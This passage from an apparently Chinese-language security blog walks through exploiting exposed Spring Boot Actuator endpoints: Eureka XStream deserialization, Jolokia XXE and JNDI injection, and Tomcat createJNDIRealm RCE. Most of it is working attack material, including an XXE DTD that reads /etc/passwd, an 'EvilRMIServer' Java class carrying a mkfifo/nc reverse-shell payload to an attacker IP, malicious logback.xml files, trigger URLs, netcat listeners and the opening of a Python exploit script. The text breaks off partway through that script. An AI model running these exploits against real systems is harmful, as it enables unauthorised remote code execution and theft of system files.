src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/e061acae7d5aaf5dd9e36a188a0c7375.png"></p><p>kali开启监听端口1234获取反弹shell</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/c2aacb012495255a8681c062a427bc34.png"></p><p>注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161</p><h5 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h5><ol><li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li><li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li><li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li></ol><p>详细分析参见下文</p><p><a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p><h4 id="2-4-Jolokia漏洞-XXE"><a href="#2-4-Jolokia漏洞-XXE" class="headerlink" title="2.4.Jolokia漏洞 XXE"></a><strong>2.4.Jolokia漏洞 XXE</strong></h4><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p></li><li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p></li><li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p></li><li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</p></li></ul><h5 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:查看已存在的 MBeans</strong></p><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><p><strong>步骤二：托管 xml 文件</strong></p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"><span class="comment"># 也可以开启apache或者nginx的http服务将其放在根目录下</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:port/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>步骤三：准备要执行的 Java 代码</strong></p><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p><p>使用Maven对其进行编译打包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure><p><strong>然后将生成的</strong> jar包拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><p><strong>步骤四：架设恶意 RMI 服务</strong></p><p>设置RMI服务的ip地址和开启服务端口8090</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><strong>步骤五：监听反弹 shell 的端口</strong></p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure><p><strong>步骤六：从外部 URL 地址加载日志配置文件</strong></p><blockquote><p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p></blockquote><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure><h5 id="利用实例-3"><a href="#利用实例-3" class="headerlink" title="利用实例"></a>利用实例</h5><p>判断是否存在jolokia插件访问<a href="http://ip:port/jolokia/list">http://ip:port/jolokia/list</a> 是否存在</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/4406018ebff3c7de7dd29c07d7e0ccc7.png"></p><p>在/jolokia/list 接口搜索关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/9fc925bb48d7fbc26191d101b9a9adab.png"></p><p><strong>读取敏感文件</strong></p><p>创建xml文档logback.xml</p><p>请求访问fileread.dtd文件，192.168.233.1为服务器ip</p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?\&gt;</span><br><span class="line"></span><br><span class="line"> \&lt;!DOCTYPE a [ \&lt;!ENTITY % remote SYSTEM</span><br><span class="line"></span><br><span class="line">  &quot;http://192.168.233.1/filereaed.dtd&quot;\&gt;%remote;%int;]\&gt;</span><br><span class="line"></span><br><span class="line">\&lt;a\&gt;&amp;trick;\&lt;/a\&gt;</span><br></pre></td></tr></table></figure></blockquote><p>将该xml放到服务器上，用于访问获取</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/2c2311a2d34ee6ff782221a35d920431.png"></p><p>创建文件fileread.dtd，读取/etc/passwd文件</p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/f2d4373437722b5f3d7ac97085b66953.png"></p><p>在外部构造url访问，Payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure><p>可以看到返回的信息中存在etc/passwd的用户信息</p><p>如红框中所示</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/66e6d7ece8ce1dbfd308720f8cbbb751.png"></p><p><strong>远程代码执行</strong></p><p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI<br>加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.  构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。</span><br><span class="line"></span><br><span class="line">2.  解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI</span><br><span class="line">    为恶意 RMI 服务地址。</span><br><span class="line"></span><br><span class="line">3.  恶意 RMI 服务器向目标返回一个 Reference 对象，Reference</span><br><span class="line">    对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class</span><br><span class="line">    的类名、属性、属性值（这里为 ELProcessor 、x、eval(...))。</span><br><span class="line"></span><br><span class="line">4.  目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用</span><br><span class="line">    factory.getObjectInstance() 方法，通过反射的方式实例化 Reference</span><br><span class="line">    所指向的任意 Bean Class，并且会调用 setter</span><br><span class="line">    方法为所有的属性赋值。对应我们的代码，最终调用 setter</span><br><span class="line">    方法的时候，就是执行如下代码：</span><br><span class="line"></span><br><span class="line">ELProcessor.eval(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;]).start()\&quot;</span><br></pre></td></tr></table></figure><p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE<br>的效果。</p><p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用maven对java代码进行编译打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure><p>打包成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/d4957a0c50e626f62d06f5fc2853ddbb.png"></p><p>将上面打包的jar放到kali上，开启8090端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如下命令:java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/d1dffff25909ba0840e280f858d32e0d.png"></p><p>使用nc开启监听1234端口</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/b531b990d627d9069028dcea04343c27.png"></p><p>下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.249:8090/jndi&quot; as=&quot;appName&quot;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>在浏览器中从外部构造url访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure><p>浏览器返回结果如下:</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1e7783f49e5d0511d34e21997052151e.png"></p><p>可以看到kali下获取反弹的shell</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/a288f1cbdbcfd6a43eb37a0aa8362ef4.png"></p><p><strong>注: 如果目标成功请求了example.xml并且 marshalsec 也接收到了目标请求，但是目标没有请求JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</strong></p><h5 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a><strong>利用原理</strong></h5><ul><li><p>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用<br>ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法</p></li><li><p>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</p></li><li><p>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</p></li><li><p>xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址</p></li><li><p>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</p></li></ul><p>详细分析参见下文:</p><p><a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p><h4 id="2-5-createJNDIRealm-RCE"><a href="#2-5-createJNDIRealm-RCE" class="headerlink" title="2.5.createJNDIRealm RCE"></a>2.5.createJNDIRealm RCE</h4><h5 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过</li></ul><h5 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看已存在的 MBeans</strong></p><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p><p><strong>步骤二：准备要执行的 Java 代码</strong></p><p>编写优化过后的用来反弹 shell 的 Java代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三： 打包java代码文件</strong></p><p>将编辑好的java代码打包成jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure><p><strong>步骤四：架设恶意 RMI服务</strong></p><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><strong>步骤五：监听反弹 shell 的端口</strong></p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure><p><strong>步骤六：发送恶意 payload</strong></p><p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行</p><h5 id="利用实例-4"><a href="#利用实例-4" class="headerlink" title="利用实例"></a>利用实例</h5><p>查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/4f19e2342528cdbb64de48d186e11598.png"></p><p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用maven对java代码进行编译打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure><p>打包成功</p><p><img src="C:\Users\ZR\Desktop\springboot\media\d4957a0c50e626f62d06f5fc2853ddbb.png"></p><p>使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.249 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/22d452ce68c413decf2ec38b91407be8.png"></p><p>在kali上使用nc监听1234端口</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/6c60a7d0bba412dd195a483ca8f132df.png"></p><p>使用exploit.py脚本对目标进行重放</p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span 